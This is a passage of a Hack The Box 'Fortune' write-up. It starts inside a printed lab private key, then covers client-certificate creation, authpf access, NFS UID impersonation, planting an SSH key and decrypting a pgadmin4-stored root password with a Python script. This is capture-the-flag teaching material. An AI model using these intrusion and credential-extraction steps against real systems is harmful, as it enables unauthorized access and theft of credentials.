LFpiex3zAvVYOuM9fkHsCp5rDsvv10/6+aUzVOXwYzNfDBU9PpdK0AnTy0rijXM4
4Ky6/DFEMRCh1yC/O99u8AomyvlPJXyOFlrijUikBGpBUE60zB0dFw62NlBZg0BX
po2sJnPZYgERFCb2jCK2SJnWWgtPvQbwHqXBLj4uxPUCggEBALEHSP/LjQHSRORv
3b29HwqrWn7+7fmM3Fsja/N8+MKyyOHtE9QJwu0Q3rM2ltdpjlBsnhOXq44F9s4U
Dt0tlZyWmnWTcU2XImEPchkbJxWF7b4jIMFVmspB7pkc61dXQhuve/Lsq5RcoA3a
oF0bYBFJP3+HFZ6NGcMf+Lf0QpKmzqLdDvgSXCpfmFvToiZ1G2HPBokEHtNrqosh
ojeQf7XbmjzKLGqyrdE2Dj/yKo6Mc0XSLRFRiMkjv7vfyxtJ2OEga+fl3loWfhW2
yre0Dofd0iN7X/Hnfj8lKYQR3o8/qy0DGTnVK2V8PuEeT/4mtjmPaH8Q+BUA3DyZ
8fJJxg8CggEAJ+AoZAWjRyHD1BkTJq2mTgxMCgLIMIFcubZQ6lZDNzVS5IHCI6EL
ml4n1A94kl2+FIEz4GcI3g2rgwY9C0d3Zoac7yzQeJ9XupRGfhv1gRXjUzCaFIUw
Ew7TZU+YP8+/hS1v7an/wmPeEDvFIQg/Av092JVTeaffxq2k9Bq2DQcw9t1Kicsm
KTNO6PvdISKMzxAAuf5ZeRNvD97mpD/Z6ViuvtCQPTJgWBO0mIi+IQtisqusPWLS
eano2dPAMUWtQTfR3K/KbbErjrr35hWWvkDley+EytgDucXQgEzMKm+QP3E3df36
J2PccV2TQy+G1t9sGvPhP0IT10Y3+RNY3QKCAQBCgyEOu2PEHO4FHHJsyXSN9als
OZa+sOykZ/7fdjBZpAsjvcmxUfAxT07+EVUz4Wo186BKlthQjVLoLd2QfeTYmGhj
IsZnjm0Ds8ezFka/3Cu7YwGt6MBfUO6Vq2MLlUDgvtcWPTvBvipfmfZtJ0x2hhNv
y6Lpg/KJrald3NHrIcS4GvE8gxz1AFmMM0j00EuJSZk66hpC2bBKMunXAquPDN3g
XPwjyvXUcxDf8Jx1MGFfO++6RlZMEO7jmB/xgonPkWP4xEcQlOQ65UfhpLjfum96
Ma9MyI3TStZzH998nMBc3LsUbXnDr0yofBt1AsLz3JsBHcgRIxYzzvtlIpjk
-----END RSA PRIVATE KEY-----
</code></pre></div></div>
<h4 id="we-can-use-them-to-generate-a-pkcs12-certificate-to-access-the-https-service-with-openssl-we-can-do-it-with-a-single-command-">We can use them to generate a <code class="highlighter-rouge">PKCS12</code> certificate to access the <code class="highlighter-rouge">https</code> service. with <code class="highlighter-rouge">openssl</code> we can do it with a single command :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl pkcs12 -export -in intermediate.cert.pem -inkey intermediate.key.pem -out fortune.p12
</code></pre></div></div>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/fortune/cert# ls -al
total 20
drwxr-xr-x 2 root root 4096 Aug  2 13:40 .
drwxr-xr-x 3 root root 4096 Aug  2 13:40 ..
-rw-r--r-- 1 root root 6810 Aug  2 13:40 intermediate.cert.pem
-rw-r--r-- 1 root root 3243 Aug  2 13:40 intermediate.key.pem
root@kali:~/Desktop/HTB/boxes/fortune/cert# openssl pkcs12 -export -in intermediate.cert.pem -inkey intermediate.key.pem -out fortune.p12
Enter Export Password:
Verifying - Enter Export Password:
root@kali:~/Desktop/HTB/boxes/fortune/cert# ls -la
total 28
drwxr-xr-x 2 root root 4096 Aug  2 13:43 .
drwxr-xr-x 3 root root 4096 Aug  2 13:40 ..
-rw------- 1 root root 4237 Aug  2 13:43 fortune.p12
-rw-r--r-- 1 root root 6810 Aug  2 13:40 intermediate.cert.pem
-rw-r--r-- 1 root root 3243 Aug  2 13:40 intermediate.key.pem
root@kali:~/Desktop/HTB/boxes/fortune/cert# 
</code></pre></div></div>
<h4 id="now-we-can-import-the-certificate-in-firefox-">Now we can import the certificate in Firefox :</h4>
<p><img src="/images/hackthebox/fortune/7.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/fortune/8.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/fortune/9.png" alt="" /></p>
<h4 id="after-removing-the-ssl-exception-it-will-ask-for-our-certificate-and-give-us-access-">After removing the SSL exception it will ask for our certificate and give us access :</h4>
<p><img src="/images/hackthebox/fortune/10.png" alt="" /></p>
<hr />

<h3 id="elevated-network-access-nfs-user-flag">Elevated Network Access, NFS, User Flag</h3>
<h4 id="after-getting-access-to-https-this-message-is-whats-on-the-index-page-">After getting access to <code class="highlighter-rouge">https</code> this message is what’s on the index page :</h4>
<p><img src="/images/hackthebox/fortune/11.png" alt="" /></p>
<h4 id="i-didnt-know-what-authpf-was-so-i-searched-about-it">I didn’t know what <code class="highlighter-rouge">authpf</code> was so I searched about it.</h4>
<blockquote>
  <p>authpf is a user shell for authenticating gateways. It is used to change pf rules when a user authenticates and starts a session with sshd and to undo these changes when the user’s session exits. It is designed for changing filter and translation rules for an individual source IP address as long as a user maintains an active ssh session. Typical use would be for a gateway that authenticates users before allowing them Internet use, or a gateway that allows different users into different places.  - <a href="https://www.freebsd.org/cgi/man.cgi?query=authpf&amp;apropos=0&amp;sektion=8&amp;manpath=FreeBSD+8.1-RELEASE+and+Ports&amp;format=html">freeBSD manual</a></p>
</blockquote>

<h4 id="so-basically-this-can-give-access-to-some-filtered-services-we-werent-allowed-to-access-before-to-use-it-we-need-a-key-and-luckily-we-can-generate-one-">So basically this can give access to some filtered services we weren’t allowed to access before, to use it we need a key and luckily we can generate one :</h4>
<p><img src="/images/hackthebox/fortune/12.png" alt="" /></p>
<h4 id="we-have-3-users-on-the-box-i-tried-all-of-them-and-nfsuser-worked-">We have 3 users on the box, I tried all of them and <code class="highlighter-rouge">nfsuser</code> worked :</h4>
<p><img src="/images/hackthebox/fortune/13.png" alt="" /></p>
<h4 id="now-is-the-time-for-another-nmap-scan-">Now is the time for another <code class="highlighter-rouge">nmap</code> scan :</h4>
<p><code class="highlighter-rouge">nmap -sV -sT -sC fortune.htb</code>
<img src="/images/hackthebox/fortune/14.png" alt="" /></p>
<h4 id="we-have-two-new-ports-8081-which-is-running-http-and-2049-which-is-running-nfs-the-http-service-gives-us-this-message-">We have two new ports, 8081 which is running <code class="highlighter-rouge">http</code> and <code class="highlighter-rouge">2049</code> which is running <code class="highlighter-rouge">nfs</code>. The <code class="highlighter-rouge">http</code> service gives us this message :</h4>
<p><img src="/images/hackthebox/fortune/15.png" alt="" /></p>
<h4 id="so-probably-we-need-to-focus-on-nfs">So probably we need to focus on <code class="highlighter-rouge">nfs</code>.</h4>
<blockquote>
  <p><strong>Network File System</strong> (<strong>NFS</strong>) is a <a href="https://en.wikipedia.org/wiki/Distributed_file_system">distributed file system</a> protocol originally developed by <a href="https://en.wikipedia.org/wiki/Sun_Microsystems">Sun Microsystems</a> in 1984, allowing a user on a client <a href="https://en.wikipedia.org/wiki/Computer">computer</a> to access files over a <a href="https://en.wikipedia.org/wiki/Computer_network">computer network</a> much like local storage is accessed.  -<a href="https://en.wikipedia.org/wiki/Network_File_System">Wikipedia</a></p>
</blockquote>

<h4 id="i-used-the-rce-script-to-check-etcexports-and-the-only-thing-there-was-home-">I used the <code class="highlighter-rouge">RCE</code> script to check <code class="highlighter-rouge">/etc/exports</code> and the only thing there was <code class="highlighter-rouge">/home</code> :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[?] command : cat /etc/exports
[*] Result :

/home
</code></pre></div></div>
<h4 id="by-using-nfs-ls-which-is-a-part-of-the-package-libnfs-utils-we-can-successfully-list-the-directories-">By using <code class="highlighter-rouge">nfs-ls</code> (which is a part of the package <code class="highlighter-rouge">libnfs-utils</code>) we can successfully list the directories :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/fortune# nfs-ls nfs://fortune.htb/home
drwxr-xr-x  2  1002  1002          512 nfsuser
drwxr-xr-x  5  1001  1001          512 bob
drwxr-x---  3  1000  1000          512 charlie
</code></pre></div></div>
<h4 id="i-created-a-directory-called-it-mnt-and-mounted-the-nfs-share-in-it-">I created a directory, called it <code class="highlighter-rouge">mnt</code> and mounted the <code class="highlighter-rouge">nfs</code> share in it :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/fortune# mkdir mnt &amp;&amp; mount -t nfs fortune.htb:/home ./mnt
root@kali:~/Desktop/HTB/boxes/fortune# ls -la mnt
total 12
drwxr-xr-x 5 root root  512 Nov  3  2018 .
drwxr-xr-x 4 root root 4096 Aug  2 14:23 ..
drwxr-xr-x 5 1001 1001  512 Nov  3  2018 bob
drwxr-x--- 3 rick rick  512 Aug  2 12:21 charlie
drwxr-xr-x 2 1002 1002  512 Nov  3  2018 nfsuser
root@kali:~/Desktop/HTB/boxes/fortune# 
</code></pre></div></div>
<h4 id="however-i-couldnt-access-charlies-directory-">However I couldn’t access <code class="highlighter-rouge">charlie</code>’s directory :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/fortune# cd mnt
root@kali:~/Desktop/HTB/boxes/fortune/mnt# cd charlie
-bash: cd: charlie: Permission denied
</code></pre></div></div>
<h4 id="this-is-because-im-trying-with-root-whose-uid-is-0-">This is because I’m trying with <code class="highlighter-rouge">root</code> whose <code class="highlighter-rouge">uid</code> is <code class="highlighter-rouge">0</code> :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/fortune/mnt# id 
uid=0(root) gid=0(root) groups=0(root)
root@kali:~/Desktop/HTB/boxes/fortune/mnt# 
</code></pre></div></div>
<h4 id="and-the-way-nfs-permissions-work-i-need-to-have-the-same-uid-as-charlie-which-is-1000-">And the way <code class="highlighter-rouge">nfs</code> permissions work I need to have the same <code class="highlighter-rouge">uid</code> as <code class="highlighter-rouge">charlie</code> which is <code class="highlighter-rouge">1000</code> :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[?] command : id charlie
[*] Result :

uid=1000(charlie) gid=1000(charlie) groups=1000(charlie), 0(wheel)
</code></pre></div></div>
<h4 id="i-already-have-a-user-on-my-box-with-the-uid-1000-called-rick-">I already have a user on my box with the <code class="highlighter-rouge">uid</code> 1000 called <code class="highlighter-rouge">rick</code> :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/fortune/mnt# id rick
uid=1000(rick) gid=1000(rick) groups=1000(rick)
root@kali:~/Desktop/HTB/boxes/fortune/mnt#
</code></pre></div></div>
<p><img src="/images/hackthebox/fortune/16.png" alt="" /></p>
<h4 id="we-owned-user">We owned user.</h4>
<p><br /></p>
<hr />

<h3 id="privilege-escalation-root-flag">Privilege Escalation, Root Flag</h3>
<h4 id="first-thing-i-wanted-to-do-is-to-get-ssh-luckily-i-had-write-access-to-authorized_keys-">First thing I wanted to do is to get <code class="highlighter-rouge">ssh</code>, luckily I had write access to <code class="highlighter-rouge">authorized_keys</code> :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rick@kali:/root/Desktop/HTB/boxes/fortune/mnt/charlie$ ls -la
total 22
drwxr-x--- 3 rick rick 512 Nov  6  2018 .
drwxr-xr-x 5 root root 512 Nov  3  2018 ..
-rw-r----- 1 rick rick 771 Oct 11  2018 .cshrc
-rw-r----- 1 rick rick 101 Oct 11  2018 .cvsrc
-rw-r----- 1 rick rick 359 Oct 11  2018 .login
-rw-r----- 1 rick rick 175 Oct 11  2018 .mailrc
-rw------- 1 rick rick 608 Nov  3  2018 mbox
-rw-r----- 1 rick rick 216 Oct 11  2018 .profile
drwx------ 2 rick rick 512 Nov  2  2018 .ssh
-r-------- 1 rick rick  33 Nov  3  2018 user.txt
-rw-r----- 1 rick rick  87 Oct 11  2018 .Xdefaults
rick@kali:/root/Desktop/HTB/boxes/fortune/mnt/charlie$ cd .ssh
rick@kali:/root/Desktop/HTB/boxes/fortune/mnt/charlie/.ssh$ ls -la
total 4
drwx------ 2 rick rick 512 Nov  2  2018 .
drwxr-x--- 3 rick rick 512 Nov  6  2018 ..
-rw------- 1 rick rick   0 Oct 11  2018 authorized_keys
rick@kali:/root/Desktop/HTB/boxes/fortune/mnt/charlie/.ssh$ 
</code></pre></div></div>
<h4 id="i-used-ssh-keygen-to-generate-a-private-and-a-public-key-">I used <code class="highlighter-rouge">ssh-keygen</code> to generate a private and a public key :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/fortune# mkdir ssh
root@kali:~/Desktop/HTB/boxes/fortune# ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): /root/Desktop/HTB/boxes/fortune/ssh/id_rsa
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /root/Desktop/HTB/boxes/fortune/ssh/id_rsa.
Your public key has been saved in /root/Desktop/HTB/boxes/fortune/ssh/id_rsa.pub.
The key fingerprint is:
SHA256:OicgBWZAaEOpjbe8y6qqvgAEJwY0qDKuSuBXQ/Gt+Cs root@kali
The key's randomart image is:
+---[RSA 2048]----+
|%B*  .           |
|=O..  o .        |
|++. .. . .       |
|B o.. . .        |
|=+...+ .S        |
|+.o...o.         |
|oo o  +..        |
|+.o  E +.        |
|%++.  ..         |
+----[SHA256]-----+
root@kali:~/Desktop/HTB/boxes/fortune# cat ssh/id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDjxkpA0ZDuhQD+S6db5Vs1jaYcBvQ95b3cIiWihMgHXZC4rMdRVgFhCKaNot9qISpBTnwlP7+NOC0GK7hVw3xDtLuqkTJb8DW2/8dsmsf3TUKX0IkFLz45kZs0eSBfBhl9CYnB5+9A/uQ1UNKufsUQ19sWuzspksvN/PA0aujwEUQgPlMlw+uSlcTxD+zTENVEJoM4cEVE5EvWg/JWYMQLbkob0k5YnDwgr3KdyWOxidsfLNXthd7FYjShVMl2yfW+r1NjJN8mCSE8z8G/GJ9ripwqWzOjgUzDvKIcODnJmt975h6h2oHExipzWj2IUJxPz41HiP3JgeSuDFP87fdz root@kali                               
root@kali:~/Desktop/HTB/boxes/fortune#
</code></pre></div></div>
<h4 id="then-i-wrote-my-public-key-to-authorized_keys-and-got-ssh-as-charlie-">Then I wrote my public key to <code class="highlighter-rouge">authorized_keys</code> and got <code class="highlighter-rouge">ssh</code> as <code class="highlighter-rouge">charlie</code> :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rick@kali:/root/Desktop/HTB/boxes/fortune/mnt/charlie/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDjxkpA0ZDuhQD+S6db5Vs1jaYcBvQ95b3cIiWihMgHXZC4rMdRVgFhCKaNot9qISpBTnwlP7+NOC0GK7hVw3xDtLuqkTJb8DW2/8dsmsf3TUKX0IkFLz45kZs0eSBfBhl9CYnB5+9A/uQ1UNKufsUQ19sWuzspksvN/PA0aujwEUQgPlMlw+uSlcTxD+zTENVEJoM4cEVE5EvWg/JWYMQLbkob0k5YnDwgr3KdyWOxidsfLNXthd7FYjShVMl2yfW+r1NjJN8mCSE8z8G/GJ9ripwqWzOjgUzDvKIcODnJmt975h6h2oHExipzWj2IUJxPz41HiP3JgeSuDFP87fdz root@kali" &gt;&gt; authorized_keys 
rick@kali:/root/Desktop/HTB/boxes/fortune/mnt/charlie/.ssh$ cd ../../../ssh/
rick@kali:/root/Desktop/HTB/boxes/fortune/ssh$ su
Password: 
root@kali:~/Desktop/HTB/boxes/fortune/ssh# ssh charlie@fortune.htb -i id_rsa
OpenBSD 6.4 (GENERIC) #349: Thu Oct 11 13:25:13 MDT 2018

Welcome to OpenBSD: The proactively secure Unix-like operating system.
fortune$ 
</code></pre></div></div>
<h4 id="in-the-home-directory-of-charlie-there-was-a-file-called-mbox-which-had-an-email-from-bob-to-charlie-thanking-him-for-setting-up-pgadmin4-for-him-and-also-telling-him-that-he-set-the-dba-password-to-the-same-as-root-password-">In the home directory of <code class="highlighter-rouge">charlie</code> there was a file called <code class="highlighter-rouge">mbox</code> which had an email from <code class="highlighter-rouge">bob</code> to <code class="highlighter-rouge">charlie</code> thanking him for setting up <code class="highlighter-rouge">pgadmin4</code> for him and also telling him that he set the <code class="highlighter-rouge">dba</code> password to the same as root password :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fortune$ ls -al
total 44
drwxr-x---  3 charlie  charlie  512 Nov  5  2018 .
drwxr-xr-x  5 root     wheel    512 Nov  2  2018 ..
-rw-r-----  1 charlie  charlie   87 Oct 11  2018 .Xdefaults
-rw-r-----  1 charlie  charlie  771 Oct 11  2018 .cshrc
-rw-r-----  1 charlie  charlie  101 Oct 11  2018 .cvsrc
-rw-r-----  1 charlie  charlie  359 Oct 11  2018 .login
-rw-r-----  1 charlie  charlie  175 Oct 11  2018 .mailrc
-rw-r-----  1 charlie  charlie  216 Oct 11  2018 .profile
drwx------  2 charlie  charlie  512 Nov  2  2018 .ssh
-rw-------  1 charlie  charlie  608 Nov  3  2018 mbox
-r--------  1 charlie  charlie   33 Nov  3  2018 user.txt
fortune$ cat mbox                                                                                                                                                                                                 
From bob@fortune.htb Sat Nov  3 11:18:51 2018
Return-Path: &lt;bob@fortune.htb&gt;
Delivered-To: charlie@fortune.htb
Received: from localhost (fortune.htb [local])
        by fortune.htb (OpenSMTPD) with ESMTPA id bf12aa53
        for &lt;charlie@fortune.htb&gt;;
        Sat, 3 Nov 2018 11:18:51 -0400 (EDT)
From:  &lt;bob@fortune.htb&gt;
Date: Sat, 3 Nov 2018 11:18:51 -0400 (EDT)
To: charlie@fortune.htb
Subject: pgadmin4
Message-ID: &lt;196699abe1fed384@fortune.htb&gt;
Status: RO

Hi Charlie,

Thanks for setting-up pgadmin4 for me. Seems to work great so far.
BTW: I set the dba password to the same as root. I hope you don't mind.

Cheers,

Bob

fortune$ 
</code></pre></div></div>
<h4 id="note--pgadmin-is-an-administration-and-development-platform-for-postgresql">Note : <a href="https://www.pgadmin.org/"><code class="highlighter-rouge">pgadmin</code></a> is an administration and development platform for <code class="highlighter-rouge">PostgreSQL</code>.</h4>
<h4 id="earlier-when-we-got-the-elevated-network-access-there-was-an-http-port-for-pgadmin4-so-i-checked-its-web-directory-in-varappsrv-and-the-database-was-there-">Earlier when we got the elevated network access there was an <code class="highlighter-rouge">http</code> port for <code class="highlighter-rouge">pgadmin4</code> so I checked its web directory in <code class="highlighter-rouge">/var/appsrv</code> and the database was there :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fortune$ cd /var/appsrv/                                                                                                                                                                                          
fortune$ ls -la
total 20
drwxr-xr-x   5 root       wheel     512 Nov  2  2018 .
drwxr-xr-x  24 root       wheel     512 Nov  2  2018 ..
drwxr-xr-x   5 _fortune   _fortune  512 Aug  2 09:15 fortune
drwxr-x---   4 _pgadmin4  wheel     512 Nov  3  2018 pgadmin4
drwxr-xr-x   4 _sshauth   _sshauth  512 Feb  3 05:08 sshauth
fortune$ cd pgadmin4/                                                                                                                                                                                             
fortune$ ls -la
total 252
drwxr-x---  4 _pgadmin4  wheel     512 Nov  3  2018 .
drwxr-xr-x  5 root       wheel     512 Nov  2  2018 ..
-rw-r-----  1 _pgadmin4  wheel  118784 Nov  3  2018 pgadmin4.db
-rw-r-----  1 _pgadmin4  wheel     479 Nov  3  2018 pgadmin4.ini
drwxr-x---  2 _pgadmin4  wheel     512 Nov  3  2018 sessions
drwxr-x---  3 _pgadmin4  wheel     512 Nov  3  2018 storage
fortune$ 
</code></pre></div></div>
<h4 id="i-downloaded-it-on-my-machine-">I downloaded it on my machine :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/fortune/ssh# scp -i id_rsa charlie@fortune.htb:/var/appsrv/pgadmin4/pgadmin4.db ../
pgadmin4.db                                                                                                                                                                      100%  116KB   7.7KB/s   00:15    
root@kali:~/Desktop/HTB/boxes/fortune/ssh# 
</code></pre></div></div>
<h4 id="then-i-used-strings-to-see-if-i-can-get-anything-interesting-">Then I used <code class="highlighter-rouge">strings</code> to see if I can get anything interesting :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/fortune# strings pgadmin4.db
SQLite format 3
indexsqlite_autoindex_debugger_function_arguments_1debugger_function_arguments

----------------
 Removed Output
----------------

ConfigDB
	ConfigDB
bob@fortune.htb$pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg
charlie@fortune.htb$pbkdf2-sha512$25000$3hvjXAshJKQUYgxhbA0BYA$iuBYZKTTtTO.cwSvMwPAYlhXRZw8aAn9gBtyNQW3Vge23gNUMe95KqiAyf37.v1lmCunWVkmfr93Wi6.W.UzaQ
bob@fortune.htb
3	charlie@fortune.htb

----------------
 Removed Output
----------------

9eSECURITY_PASSWORD_SALTqIhAhRt3xq_dzIEqyJQFmWnymFbO1cZVhbQaTWA-v9Q=9
!eSECRET_KEYR_EFY1hb236guS3jNq1aHyPcruXbjk7Ff-QwL6PMqJM=?
-eCSRF_SESSION_KEYsaQWKx5BCyVZMH2weOiNv3Dsvzh4GchPM16kwBRYPxs=

----------------
 Removed Output
----------------

8postgresdbautUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGzprefer&lt;STORAGE_DIR&gt;/.postgresql/postgresql.crt&lt;STORAGE_DIR&gt;/.postgresql/postgresql.key22

----------------
 Removed Output
----------------
</code></pre></div></div>
<h4 id="i-got-some-salted-hashes-and-most-importantly-this-">I got some salted hashes, and most importantly this :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>postgresdba utUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGz
</code></pre></div></div>
<h4 id="this-is-the-db-administrators-password-hash-and-we-know-that-its-the-same-as-the-root-password">This is the db administrator’s password hash and we know that it’s the same as the root password.</h4>
<h4 id="pgadmin-is-an-open-source-software-so-i-searched-on-github-for-any-cryptography-related-stuff-and-found-this-script-called-cryptopy"><code class="highlighter-rouge">pgadmin</code> is an open-source software so I searched on <code class="highlighter-rouge">github</code> for any cryptography related stuff and found this script called <a href="https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py"><code class="highlighter-rouge">crypto.py</code></a>.</h4>
<h4 id="i-took-the-functions-needed-to-decrypt-the-hash-then-i-created-a-script-to-take-the-hashthe-key-and-decrypt-the-hash-using-the-functions-from-cryptopy">I took the functions needed to decrypt the hash then I created a script to take the hash/the key and decrypt the hash using the functions from <code class="highlighter-rouge">crypto.py</code>:</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python</span>
<span class="kn">from</span> <span class="nn">__future__</span> <span class="kn">import</span> <span class="n">division</span>
<span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">import</span> <span class="nn">hashlib</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">six</span>
<span class="kn">from</span> <span class="nn">cryptography.hazmat.backends</span> <span class="kn">import</span> <span class="n">default_backend</span>
<span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives.ciphers</span> <span class="kn">import</span> <span class="n">Cipher</span>
<span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives.ciphers.algorithms</span> <span class="kn">import</span> <span class="n">AES</span>
<span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives.ciphers.modes</span> <span class="kn">import</span> <span class="n">CFB8</span>

<span class="n">padding_string</span> <span class="o">=</span> <span class="n">b</span><span class="s">'}'</span>
<span class="n">iv_size</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">block_size</span> <span class="o">//</span> <span class="mi">8</span>


<span class="k">def</span> <span class="nf">pad</span><span class="p">(</span><span class="n">key</span><span class="p">):</span>
    <span class="s">"""Add padding to the key."""</span>

    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">six</span><span class="o">.</span><span class="n">text_type</span><span class="p">):</span>
        <span class="n">key</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>

    <span class="c"># Key must be maximum 32 bytes long, so take first 32 bytes</span>
    <span class="n">key</span> <span class="o">=</span> <span class="n">key</span><span class="p">[:</span><span class="mi">32</span><span class="p">]</span>

    <span class="c"># If key size is 16, 24 or 32 bytes then padding is not required</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span> <span class="ow">in</span> <span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">32</span><span class="p">):</span>
        <span class="k">return</span> <span class="n">key</span>

    <span class="c"># Add padding to make key 32 bytes long</span>
    <span class="k">return</span> <span class="n">key</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="n">padding_string</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
    <span class="s">"""
    Decrypt the AES encrypted string.

    Parameters:
        ciphertext -- Encrypted string with AES method.
        key        -- key to decrypt the encrypted string.
    """</span>

    <span class="n">ciphertext</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">)</span>
    <span class="n">iv</span> <span class="o">=</span> <span class="n">ciphertext</span><span class="p">[:</span><span class="n">iv_size</span><span class="p">]</span>

    <span class="n">cipher</span> <span class="o">=</span> <span class="n">Cipher</span><span class="p">(</span><span class="n">AES</span><span class="p">(</span><span class="n">pad</span><span class="p">(</span><span class="n">key</span><span class="p">)),</span> <span class="n">CFB8</span><span class="p">(</span><span class="n">iv</span><span class="p">),</span> <span class="n">default_backend</span><span class="p">())</span>
    <span class="n">decryptor</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">decryptor</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">decryptor</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">[</span><span class="n">iv_size</span><span class="p">:])</span> <span class="o">+</span> <span class="n">decryptor</span><span class="o">.</span><span class="n">finalize</span><span class="p">()</span>

<span class="n">ciphertext</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">(</span><span class="s">"hash : "</span><span class="p">)</span>
<span class="n">key</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">(</span><span class="s">"key : "</span><span class="p">)</span>
<span class="n">password</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">,</span><span class="n">key</span><span class="p">)</span>

<span class="k">print</span> <span class="s">"[*] Password : "</span> <span class="o">+</span> <span class="n">password</span>
</code></pre></div></div>
<h4 id="the-only-thing-left-is-to-give-the-right-key-i-tried-the-other-hashes-i-got-from-the-database-as-a-key-and-bobs-hash-worked-">The only thing left is to give the right key, I tried the other hashes I got from the database as a key and <code class="highlighter-rouge">bob</code>’s hash worked :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg
</code></pre></div></div>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/fortune# ./decrypt.py 
hash : utUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGz
key : $pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg
[*] Password : R3us3-0f-a-P4ssw0rdl1k3th1s?_B4D.ID3A!
root@kali:~/Desktop/HTB/boxes/fortune# 
</code></pre></div></div>
<p><img src="/images/hackthebox/fortune/17.png" alt="" /></p>
<h4 id="and-we-owned-root-">And we owned root !</h4>
<h4 id="thats-it--feedback-is-appreciated-">That’s it , Feedback is appreciated !</h4>
<h4 id="dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-ahm3d_h3sham">Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham">@Ahm3d_H3sham</a></h4>
<h4 id="thanks-for-reading">Thanks for reading.</h4>
<p><br />
<br /></p>
<h4 id="previous-hack-the-box-write-up--hack-the-box---lacasadepapel">Previous Hack The Box write-up : <a href="/hack-the-box/lacasadepapel/">Hack The Box - LaCasaDePapel</a></h4>
<h4 id="next-hack-the-box-write-up--hack-the-box---arkham">Next Hack The Box write-up : <a href="/hack-the-box/arkham/">Hack The Box - Arkham</a></h4>
<hr />


